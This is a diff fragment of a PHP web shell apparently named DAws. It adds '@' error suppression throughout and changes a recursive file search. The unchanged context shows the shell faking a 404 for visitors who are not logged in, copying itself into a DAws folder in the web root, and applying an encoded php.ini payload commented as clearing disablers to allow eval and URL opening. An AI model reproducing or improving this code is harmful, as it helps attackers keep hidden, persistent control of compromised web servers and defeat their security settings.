@@ -220,7 +220,10 @@ function recursive_glob($path) {
 	}
 
 	foreach ($paths as $path) {
-		recursive_glob($path);
+		$path = recursive_glob($path);
+		if ($path != "") {
+			return $path;
+		}
 	}
 }
 
@@ -364,12 +367,12 @@ if (!isset($_SESSION["logged_in"])) {
 			$_SESSION["logged_in"] = True;
 		} else {
 			session_destroy();
-			header("HTTP/1.1 404 Not Found");
+			@header("HTTP/1.1 404 Not Found");
 			$show_it = True;
 		}
 	} else {
 		session_destroy();
-		header("HTTP/1.1 404 Not Found");
+		@header("HTTP/1.1 404 Not Found");
 		$show_it = True;
 	}
 	
@@ -383,7 +386,7 @@ if (!isset($_SESSION["logged_in"])) {
 		
 		$random_string = time();
 		$random_url .= "://".$_SERVER['SERVER_NAME']."/".$random_string."/DAws.php"; //our random bitch
-		$output = url_get_contents($random_url);
+		$output = @url_get_contents($random_url);
 
 		if ($output != "") {
 			echo str_replace("/".$random_string."/DAws.php", "/DAws.php", $output);
@@ -448,7 +451,7 @@ if (!isset($_SESSION["daws_directory"])) {
 	if (basename($_SESSION["daws_directory"]) != "DAws") { //We just landed, time to get ready for battle because we got some mofos to kill!
 		$_SESSION["daws_directory"] .= "/DAws";
 		@mkdir($_SESSION["daws_directory"]); //incase it already existed. We'll simply replace the old files of DAws with the new ones.
-	
+
 		if (strpos($_SESSION["daws_directory"], $_SESSION["web_dir"]) !== False) {
 			//we clear all disablers, allow eval and url opening
 			$php_ini = "AAYHAhIcAzYKEAoMAAofHhVJUW8ABgcCEhwDNg8JBRwHBgNQW2MfEAwABwoeXgMRCQYRGxsRXhYTBw9LBgMVABscDxoYRVlPVkF6AxMBAxYNAVoGCBUFHBgKFkEQCgMRBAUJOgEZFQ9QTUYmCgNuDhgPHwc5HB4JOwkbExUeRlRMKgo=";
@@ -2086,7 +2089,7 @@ if (file_exists($dir) && (is_readable($dir))) {
 					}
 
 					if (is_executable($dir)) {
-						echo "<td>".filesize($curr_dir)."</td>";
+						echo "<td>".@filesize($curr_dir)."</td>";
 					} else {
 						echo "<td></td>";
 					}
@@ -2094,13 +2097,13 @@ if (file_exists($dir) && (is_readable($dir))) {
 					$fileowner = "";
 					$filegroup = "";
 					if ((is_executable($dir)) && (installed_php("fileowner")) && (installed_php("filegroup"))) {
-						$fileowner = fileowner($curr_dir);
-						$filegroup = filegroup($curr_dir);
+						$fileowner = @fileowner($curr_dir);
+						$filegroup = @filegroup($curr_dir);
 
 						if (installed_php("posix_getpwuid")) {
-							$fileowner = posix_getpwuid($fileowner);
+							$fileowner = @posix_getpwuid($fileowner);
 							$fileowner = $fileowner["name"]; //don't blame me for this, blame old versions of php...
-							$filegroup = posix_getgrgid($filegroup);
+							$filegroup = @posix_getgrgid($filegroup);
 							$filegroup = $filegroup["name"];
 						}
 					}
@@ -2108,7 +2111,7 @@ if (file_exists($dir) && (is_readable($dir))) {
 					echo "<td>$filegroup</td>";
 
 					if (is_executable($dir)) {
-						echo "<td>".get_permissions($curr_dir)."</td>";
+						echo "<td>".@get_permissions($curr_dir)."</td>";
 					} else {
 						echo "<td></td>";
 					}
